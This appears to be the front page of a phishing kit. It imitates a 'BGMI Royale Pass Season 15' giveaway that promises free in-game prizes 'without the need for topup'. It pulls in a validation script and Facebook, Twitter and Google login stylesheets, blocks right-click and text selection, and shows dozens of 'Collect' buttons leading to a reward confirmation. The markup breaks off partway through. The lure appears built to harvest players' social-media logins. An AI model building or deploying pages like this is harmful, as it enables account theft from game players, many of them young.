<?php
include "validate.php";
?>
<html>
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" />
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="BGMI - Royale Pass Season 15">
<meta name="description" content="Royale Pass Season 15 has begun! Collect your favorite prizes here right now !!! This promo is free without the need for topup. Come join this event with friends all over the world now!">
<meta property="og:description" content="Royale Pass Season 15 has begun! Collect your favorite prizes here right now !!! This promo is free without the need for topup. Come join this event with friends all over the world now!">
<meta property="og:url" content="./">
<meta property="og:site_name" content="BGMI - Royale Pass Season 15">
<meta property="og:type" content="website">
<meta name="copyright" content="BGMI">
<meta name="theme-color" content="#000">
<meta property="og:image" content="https://i.ibb.co/y4BNtrv/season.png">
<title>BGMI - Royale Pass Season 21</title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/login/facebook.css">
<link rel="stylesheet" href="css/login/twitter.css">
<link rel="stylesheet" href="css/login/google.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="ajax/libs/material-design-iconic-font/2-2-0/css/material-design-iconic-font.css">
<link href="font-awesome/4-7-0/css/font-awesome.min.css" rel="stylesheet" >
<link rel="icon" href="https://github.com/LUCIFERGREYHAT1/maxfiles/assets/85693629/47532cad-6027-4b7c-a135-4d387a48f193">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
<div class="container">
<div class="g-mask">
<div class="navbar">
<div class="navbar-menu">
<i class="fa fa-bars"></i>
</div> 
<div class="navbar-logo-box">
<img src="https://github.com/LUCIFERGREYHAT1/maxfiles/assets/85693629/01e02a41-e408-477b-bee4-fc7d2e7cb7a0">
</div> 
</div> 
<div class="reward-content">
<div class="menu-wrapper">
<center>
<div class="menu-choose kiri" style="border-top-left-radius: 3px; border-bottom-left-radius: 3px;" onclick="openRewards(event, 'latest');" id="defaultTabRewards">Latest Reward</div>
<div class="menu-choose kanan" style="border-top-right-radius: 3px; border-bottom-right-radius: 3px;" onclick="openRewards(event, 'other');">Other Reward</div>
<div class="menu-choose tengah" onclick="openRewards(event, 'season');">Season Reward</div>
</center>
</div> 
<div class="tab_rewards" id="latest">
<div class="menu-notify">
<div class="menu-notify-icon"><i class="zmdi zmdi-info-outline"></i></div>
<div class="menu-notify-txt">Hi survivor, this is the latest reward for you today</div>
</div> 
<div class="scroll">
<div class="item kanan">
<img src="https://user-images.githubusercontent.com/49580304/102170024-48825300-3e48-11eb-9f7b-0deb14d48230.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102170024-48825300-3e48-11eb-9f7b-0deb14d48230.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://user-images.githubusercontent.com/49580304/102170601-98154e80-3e49-11eb-8fd3-3b715ef0df65.jpg">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102170601-98154e80-3e49-11eb-8fd3-3b715ef0df65.jpg">Collect</button>
</div>
<div class="item tengah">
<img src="https://user-images.githubusercontent.com/49580304/102170765-f2161400-3e49-11eb-8a2f-2183aba4ee05.jpg">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102170765-f2161400-3e49-11eb-8a2f-2183aba4ee05.jpgss">Collect</button>
</div>
<div class="item kanan">
<img src="https://user-images.githubusercontent.com/49580304/102170871-2db0de00-3e4a-11eb-9abb-99f1e6e9e293.jpg">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102170871-2db0de00-3e4a-11eb-9abb-99f1e6e9e293.jpg">Collect</button>
</div>
<div class="item kiri">
<img src="https://user-images.githubusercontent.com/49580304/102170895-3acdcd00-3e4a-11eb-840d-3b05bf73e93e.jpg">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102170895-3acdcd00-3e4a-11eb-840d-3b05bf73e93e.jpg">Collect</button>
</div>
<div class="item tengah">
<img src="https://user-images.githubusercontent.com/49580304/102170936-4d480680-3e4a-11eb-9a68-0dafcb0c9afc.jpg">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102170936-4d480680-3e4a-11eb-9a68-0dafcb0c9afc.jpg">Collect</button>
</div>
<div class="item kanan">
<img src="https://user-images.githubusercontent.com/49580304/102170962-5afd8c00-3e4a-11eb-979d-bbbb54e4ed76.jpg">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102170962-5afd8c00-3e4a-11eb-979d-bbbb54e4ed76.jpg">Collect</button>
</div>
<div class="item kiri">
<img src="https://user-images.githubusercontent.com/49580304/102171006-68b31180-3e4a-11eb-996d-57e64569e600.jpg">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102171006-68b31180-3e4a-11eb-996d-57e64569e600.jpg">Collect</button>
</div>
<div class="item tengah">
<img src="https://user-images.githubusercontent.com/49580304/102171023-749ed380-3e4a-11eb-80a6-226dd45b1017.jpg">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102171023-749ed380-3e4a-11eb-80a6-226dd45b1017.jpg">Collect</button>
</div>
<div class="item kanan">
<img src="https://user-images.githubusercontent.com/49580304/102171232-e70fb380-3e4a-11eb-90bb-03dc2bf02501.jpg">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102171232-e70fb380-3e4a-11eb-90bb-03dc2bf02501.jpg">Collect</button>
</div>
<div class="item kiri">
<img src="https://user-images.githubusercontent.com/49580304/102171251-f42ca280-3e4a-11eb-9c24-2777e124ff92.jpg">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102171251-f42ca280-3e4a-11eb-9c24-2777e124ff92.jpg">Collect</button>
</div>
<div class="item tengah">
<img src="https://user-images.githubusercontent.com/49580304/102171272-03abeb80-3e4b-11eb-8fcc-6dec3262d594.jpg">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102171272-03abeb80-3e4b-11eb-8fcc-6dec3262d594.jpg">Collect</button>
</div>
<div class="item kanan">
<img src="https://user-images.githubusercontent.com/49580304/102171288-0dcdea00-3e4b-11eb-9bb9-282db8b0d7b9.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102171288-0dcdea00-3e4b-11eb-9bb9-282db8b0d7b9.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://user-images.githubusercontent.com/49580304/102171307-19211580-3e4b-11eb-80a9-60db877783f6.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102171307-19211580-3e4b-11eb-80a9-60db877783f6.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://user-images.githubusercontent.com/49580304/102171586-bda35780-3e4b-11eb-986e-d72196fb17e7.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102171586-bda35780-3e4b-11eb-986e-d72196fb17e7.png">Collect</button>
</div>
<div class="item kanan">
<img src="https://user-images.githubusercontent.com/49580304/102171618-d14ebe00-3e4b-11eb-8ec6-30567dbaab9c.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102171618-d14ebe00-3e4b-11eb-8ec6-30567dbaab9c.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://user-images.githubusercontent.com/49580304/102171645-e62b5180-3e4b-11eb-94f3-098c27eba556.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102171645-e62b5180-3e4b-11eb-94f3-098c27eba556.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://user-images.githubusercontent.com/49580304/102171712-0c50f180-3e4c-11eb-935a-fb8c5e109758.jpg">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102171712-0c50f180-3e4c-11eb-935a-fb8c5e109758.jpg">Collect</button>
</div>
<div class="item kanan">
<img src="https://user-images.githubusercontent.com/49580304/102171745-18d54a00-3e4c-11eb-82f4-41e1fda7fb7d.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102171745-18d54a00-3e4c-11eb-82f4-41e1fda7fb7d.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://user-images.githubusercontent.com/49580304/102171769-225eb200-3e4c-11eb-94de-86e205705194.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102171769-225eb200-3e4c-11eb-94de-86e205705194.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://user-images.githubusercontent.com/49580304/102171788-2db1dd80-3e4c-11eb-95cf-ccfa0a3474ff.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102171788-2db1dd80-3e4c-11eb-95cf-ccfa0a3474ff.png">Collect</button>
</div>
<div class="item kanan">
<img src="https://user-images.githubusercontent.com/49580304/102171829-49b57f00-3e4c-11eb-8668-8f32c2c779a5.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102171829-49b57f00-3e4c-11eb-8668-8f32c2c779a5.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://user-images.githubusercontent.com/49580304/102171846-576b0480-3e4c-11eb-877b-dd3121cde912.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102171846-576b0480-3e4c-11eb-877b-dd3121cde912.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://user-images.githubusercontent.com/49580304/102171865-6651b700-3e4c-11eb-817d-0e2ed4ad59dc.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102171865-6651b700-3e4c-11eb-817d-0e2ed4ad59dc.png">Collect</button>
</div>
<div class="item kanan">
<img src="https://user-images.githubusercontent.com/49580304/102171903-7cf80e00-3e4c-11eb-9596-6f79a02bdca3.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102171903-7cf80e00-3e4c-11eb-9596-6f79a02bdca3.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://user-images.githubusercontent.com/49580304/102171926-8bdec080-3e4c-11eb-8ef8-3c2d56c96f72.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102171926-8bdec080-3e4c-11eb-8ef8-3c2d56c96f72.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://user-images.githubusercontent.com/49580304/102171951-9e58fa00-3e4c-11eb-9edf-2affce6a55f5.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102171951-9e58fa00-3e4c-11eb-9edf-2affce6a55f5.png">Collect</button>
</div>
<div class="item kanan">
<img src="https://user-images.githubusercontent.com/49580304/102171972-add84300-3e4c-11eb-836f-f468d647282e.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102171972-add84300-3e4c-11eb-836f-f468d647282e.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://user-images.githubusercontent.com/49580304/102171989-ba5c9b80-3e4c-11eb-8f7e-a95b56e87957.jpg">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102171989-ba5c9b80-3e4c-11eb-8f7e-a95b56e87957.jpg">Collect</button>
</div>
<div class="item tengah">
<img src="https://user-images.githubusercontent.com/49580304/102172021-d3654c80-3e4c-11eb-9ad5-17ca9c7cc6cd.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102172021-d3654c80-3e4c-11eb-9ad5-17ca9c7cc6cd.png">Collect</button>
</div>
<div class="item kanan">
<img src="https://user-images.githubusercontent.com/49580304/102172048-e1b36880-3e4c-11eb-937f-f6f16ab657f3.jpg">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102172048-e1b36880-3e4c-11eb-937f-f6f16ab657f3.jpg">Collect</button>
</div>
<div class="item kiri">
<img src="https://user-images.githubusercontent.com/49580304/102172072-ed9f2a80-3e4c-11eb-9b2d-d04888fe1d8c.jpg">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102172072-ed9f2a80-3e4c-11eb-9b2d-d04888fe1d8c.jpg">Collect</button>
</div>
<div class="item tengah">
<img src="https://user-images.githubusercontent.com/49580304/102172094-fabc1980-3e4c-11eb-98f1-6bfe9d571b7a.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102172094-fabc1980-3e4c-11eb-98f1-6bfe9d571b7a.png">Collect</button>
</div>
<div class="item kanan">
<img src="https://user-images.githubusercontent.com/49580304/102172133-0ad3f900-3e4d-11eb-86e3-1b17a2f973f3.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102172133-0ad3f900-3e4d-11eb-86e3-1b17a2f973f3.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://user-images.githubusercontent.com/49580304/102172155-145d6100-3e4d-11eb-8c8c-3b755443e58a.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102172155-145d6100-3e4d-11eb-8c8c-3b755443e58a.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://user-images.githubusercontent.com/49580304/102172179-20492300-3e4d-11eb-9747-6f67353a69fd.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102172179-20492300-3e4d-11eb-9747-6f67353a69fd.png">Collect</button>
</div>
<div class="item kanan">
<img src="https://user-images.githubusercontent.com/49580304/102172203-2e973f00-3e4d-11eb-8867-92bc1f48fa77.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102172203-2e973f00-3e4d-11eb-8867-92bc1f48fa77.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://user-images.githubusercontent.com/49580304/102172236-41aa0f00-3e4d-11eb-8e93-e68ba3f31bbe.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102172236-41aa0f00-3e4d-11eb-8e93-e68ba3f31bbe.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://user-images.githubusercontent.com/49580304/102172273-52f31b80-3e4d-11eb-9cd4-8d7bb6514b0a.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102172273-52f31b80-3e4d-11eb-9cd4-8d7bb6514b0a.png">Collect</button>
</div>
<div class="item kanan">
<img src="https://user-images.githubusercontent.com/49580304/102172296-5be3ed00-3e4d-11eb-892e-0ebd09645e9a.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102172296-5be3ed00-3e4d-11eb-892e-0ebd09645e9a.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://user-images.githubusercontent.com/49580304/102172320-67cfaf00-3e4d-11eb-97c6-b3763732d0b2.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102172320-67cfaf00-3e4d-11eb-97c6-b3763732d0b2.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://user-images.githubusercontent.com/49580304/102172357-74ec9e00-3e4d-11eb-87d1-98cf02f375c4.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102172357-74ec9e00-3e4d-11eb-87d1-98cf02f375c4.png">Collect</button>
</div>
<div class="item kanan">
<img src="https://user-images.githubusercontent.com/49580304/102172389-82098d00-3e4d-11eb-98c5-201a5963cf38.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102172389-82098d00-3e4d-11eb-98c5-201a5963cf38.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://user-images.githubusercontent.com/49580304/102172469-acf3e100-3e4d-11eb-9932-3a842b4bbe66.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102172469-acf3e100-3e4d-11eb-9932-3a842b4bbe66.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://user-images.githubusercontent.com/49580304/102172493-bb41fd00-3e4d-11eb-83ff-1e274f721fb2.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102172493-bb41fd00-3e4d-11eb-83ff-1e274f721fb2.png">Collect</button>
</div>
<div class="item kanan">
<img src="https://user-images.githubusercontent.com/49580304/102178437-40cbaa00-3e5a-11eb-9ed8-345bfa52aac0.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102178437-40cbaa00-3e5a-11eb-9ed8-345bfa52aac0.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://user-images.githubusercontent.com/49580304/102172512-c5fc9200-3e4d-11eb-8edf-cc5d3edec393.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102172512-c5fc9200-3e4d-11eb-8edf-cc5d3edec393.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://user-images.githubusercontent.com/49580304/102172644-052ae300-3e4e-11eb-9881-f8da2f522ac5.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102172644-052ae300-3e4e-11eb-9881-f8da2f522ac5.png">Collect</button>
</div>
<div class="item kanan">
<img src="https://user-images.githubusercontent.com/49580304/102172662-1116a500-3e4e-11eb-862e-1f4690a5be71.jpg">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102172662-1116a500-3e4e-11eb-862e-1f4690a5be71.jpg">Collect</button>
</div>
<div class="item kiri">
<img src="https://user-images.githubusercontent.com/49580304/102172678-1aa00d00-3e4e-11eb-9fbc-710534cb7359.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102172678-1aa00d00-3e4e-11eb-9fbc-710534cb7359.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://user-images.githubusercontent.com/49580304/102172705-28559280-3e4e-11eb-8dc7-211157aa3b41.jpg">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102172705-28559280-3e4e-11eb-8dc7-211157aa3b41.jpg">Collect</button>
</div>
<div class="item kanan">
<img src="https://user-images.githubusercontent.com/49580304/102172748-41f6da00-3e4e-11eb-9caf-7e2e9b5df811.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102172748-41f6da00-3e4e-11eb-9caf-7e2e9b5df811.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://user-images.githubusercontent.com/49580304/102172761-4de29c00-3e4e-11eb-8fbf-50af141a0437.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102172761-4de29c00-3e4e-11eb-8fbf-50af141a0437.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://user-images.githubusercontent.com/49580304/102172780-5935c780-3e4e-11eb-9c23-00fae07a1f48.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102172780-5935c780-3e4e-11eb-9c23-00fae07a1f48.png">Collect</button>
</div>
<div class="item kanan">
<img src="https://user-images.githubusercontent.com/49580304/102172795-6357c600-3e4e-11eb-8e88-a4ff1b88dfe2.jpg">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102172795-6357c600-3e4e-11eb-8e88-a4ff1b88dfe2.jpg">Collect</button>
</div>
<div class="item kiri">
<img src="https://user-images.githubusercontent.com/49580304/102172840-7cf90d80-3e4e-11eb-8771-d905763cf2cd.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102172840-7cf90d80-3e4e-11eb-8771-d905763cf2cd.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://user-images.githubusercontent.com/49580304/102172856-87b3a280-3e4e-11eb-97e9-ea8ad6b0f995.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102172856-87b3a280-3e4e-11eb-97e9-ea8ad6b0f995.png">Collect</button>
</div>
<div class="item kanan">
<img src="https://user-images.githubusercontent.com/49580304/102172868-926e3780-3e4e-11eb-9cb0-12b4a81aff97.jpg">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102172868-926e3780-3e4e-11eb-9cb0-12b4a81aff97.jpg">Collect</button>
</div>
<div class="item kiri">
<img src="https://user-images.githubusercontent.com/49580304/102172890-9ef29000-3e4e-11eb-9dfa-ee825237f215.jpg">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102172890-9ef29000-3e4e-11eb-9dfa-ee825237f215.jpg">Collect</button>
</div>
<div class="item tengah">
<img src="https://user-images.githubusercontent.com/49580304/102172947-ca757a80-3e4e-11eb-9f3f-d28720089510.jpg">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102172947-ca757a80-3e4e-11eb-9f3f-d28720089510.jpg">Collect</button>
</div>
<div class="item kanan">
<img src="https://user-images.githubusercontent.com/49580304/102172974-d5300f80-3e4e-11eb-80df-b6882a07ea89.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102172974-d5300f80-3e4e-11eb-80df-b6882a07ea89.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://user-images.githubusercontent.com/49580304/102172983-e0833b00-3e4e-11eb-94b7-1309f3b8389e.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102172983-e0833b00-3e4e-11eb-94b7-1309f3b8389e.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://user-images.githubusercontent.com/49580304/102173000-ea0ca300-3e4e-11eb-992a-3232af1d463e.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102173000-ea0ca300-3e4e-11eb-992a-3232af1d463e.png">Collect</button>
</div>
<div class="item kanan">
<img src="https://user-images.githubusercontent.com/49580304/102173038-fdb80980-3e4e-11eb-82b6-0556f4a65658.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102173038-fdb80980-3e4e-11eb-82b6-0556f4a65658.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://user-images.githubusercontent.com/49580304/102173048-06a8db00-3e4f-11eb-81ca-4059f96c6fb7.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102173048-06a8db00-3e4f-11eb-81ca-4059f96c6fb7.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://user-images.githubusercontent.com/49580304/102173065-16c0ba80-3e4f-11eb-8a63-c2dacbfb7f3a.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102173065-16c0ba80-3e4f-11eb-8a63-c2dacbfb7f3a.png">Collect</button>
</div>
<div class="item kanan">
<img src="https://user-images.githubusercontent.com/49580304/102173088-217b4f80-3e4f-11eb-898a-1ee3fc271473.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102173088-217b4f80-3e4f-11eb-898a-1ee3fc271473.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://user-images.githubusercontent.com/49580304/102175229-f5ae9880-3e53-11eb-9837-9e1b7f8504a5.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102175229-f5ae9880-3e53-11eb-9837-9e1b7f8504a5.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://user-images.githubusercontent.com/49580304/102175259-0a8b2c00-3e54-11eb-960a-a57302642d72.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102175259-0a8b2c00-3e54-11eb-960a-a57302642d72.png">Collect</button>
</div>
<div class="item kanan">
<img src="https://user-images.githubusercontent.com/49580304/102175297-1d056580-3e54-11eb-8690-bf19d72d6655.jpg">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102175297-1d056580-3e54-11eb-8690-bf19d72d6655.jpg">Collect</button>
</div>
<div class="item kiri">
<img src="https://user-images.githubusercontent.com/49580304/102175309-255da080-3e54-11eb-9360-50347bbf8a1c.jpg">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102175309-255da080-3e54-11eb-9360-50347bbf8a1c.jpg">Collect</button>
</div>
<div class="item tengah">
<img src="https://user-images.githubusercontent.com/49580304/102175342-37d7da00-3e54-11eb-9036-73d85a603d0e.jpg">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102175342-37d7da00-3e54-11eb-9036-73d85a603d0e.jpg">Collect</button>
</div>
<div class="item kanan">
<img src="https://user-images.githubusercontent.com/49580304/102175398-563dd580-3e54-11eb-8342-4885bb45f57a.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102175398-563dd580-3e54-11eb-8342-4885bb45f57a.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://user-images.githubusercontent.com/49580304/102175412-5f2ea700-3e54-11eb-87d7-fbb2d98c7c55.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102175412-5f2ea700-3e54-11eb-87d7-fbb2d98c7c55.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://user-images.githubusercontent.com/49580304/102175430-6b1a6900-3e54-11eb-850b-f6defe15db94.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102175430-6b1a6900-3e54-11eb-850b-f6defe15db94.png">Collect</button>
</div>
<div class="item kanan">
<img src="https://user-images.githubusercontent.com/49580304/102175490-85544700-3e54-11eb-9236-94e49066c060.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102175490-85544700-3e54-11eb-9236-94e49066c060.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://user-images.githubusercontent.com/49580304/102175524-9309cc80-3e54-11eb-84fd-c9264ba64d32.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102175524-9309cc80-3e54-11eb-84fd-c9264ba64d32.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://user-images.githubusercontent.com/49580304/102175556-9f8e2500-3e54-11eb-9634-bd220ffdb071.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102175556-9f8e2500-3e54-11eb-9634-bd220ffdb071.png">Collect</button>
</div>
<div class="item kanan">
<img src="https://user-images.githubusercontent.com/49580304/102175649-c3516b00-3e54-11eb-948f-79444233d27b.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102175649-c3516b00-3e54-11eb-948f-79444233d27b.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://user-images.githubusercontent.com/49580304/102175672-cd736980-3e54-11eb-91df-c4acd5f8715b.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102175672-cd736980-3e54-11eb-91df-c4acd5f8715b.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://user-images.githubusercontent.com/49580304/102175694-d6fcd180-3e54-11eb-8c22-76a4c3845167.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102175694-d6fcd180-3e54-11eb-8c22-76a4c3845167.png">Collect</button>
</div>
<div class="item kanan">
<img src="https://user-images.githubusercontent.com/49580304/102175782-f693fa00-3e54-11eb-9a57-dc151ab7fbc8.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102175782-f693fa00-3e54-11eb-9a57-dc151ab7fbc8.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://user-images.githubusercontent.com/49580304/102175810-00b5f880-3e55-11eb-8177-3adbf27fc3d2.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102175810-00b5f880-3e55-11eb-8177-3adbf27fc3d2.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://user-images.githubusercontent.com/49580304/102175856-13c8c880-3e55-11eb-8427-8fc1a794c439.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102175856-13c8c880-3e55-11eb-8427-8fc1a794c439.png">Collect</button>
</div>
<div class="item kanan">
<img src="https://user-images.githubusercontent.com/49580304/102175885-204d2100-3e55-11eb-9742-d46e7d62ca5c.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102175885-204d2100-3e55-11eb-9742-d46e7d62ca5c.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://user-images.githubusercontent.com/49580304/102175916-2c38e300-3e55-11eb-9c20-834181a1a1b4.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102175916-2c38e300-3e55-11eb-9c20-834181a1a1b4.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://user-images.githubusercontent.com/49580304/102175947-36f37800-3e55-11eb-9f56-69ce66304348.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://user-images.githubusercontent.com/49580304/102175947-36f37800-3e55-11eb-9f56-69ce66304348.png">Collect</button>
</div>
</div> 
</div> 
<div class="tab_rewards" id="season">
<div class="menu-notify">
<div class="menu-notify-icon"><i class="zmdi zmdi-info-outline"></i></div>
